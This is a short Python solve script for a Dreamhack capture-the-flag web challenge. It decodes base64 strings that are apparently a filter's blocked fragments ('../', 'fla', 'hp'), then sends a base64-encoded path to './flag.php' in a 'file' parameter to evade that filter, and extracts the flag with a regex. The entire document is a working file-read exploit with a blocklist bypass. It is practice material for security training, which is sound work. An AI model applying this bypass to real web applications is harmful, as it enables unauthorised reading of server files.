import base64
import requests
import re

HOST = "http://host1.dreamhack.games"
PORT = 23336

check = ["Li4v", "Zmxh", "aHA="]
print([base64.b64decode(c).decode() for c in check])

print(base64.b64encode(b"./flag.php").decode())
res = requests.get(
    f"{HOST}:{PORT}/", params={"file": base64.b64encode(b"./flag.php").decode()}
)
flag = re.search(r"DH{.*}", res.text).group()
print(flag)
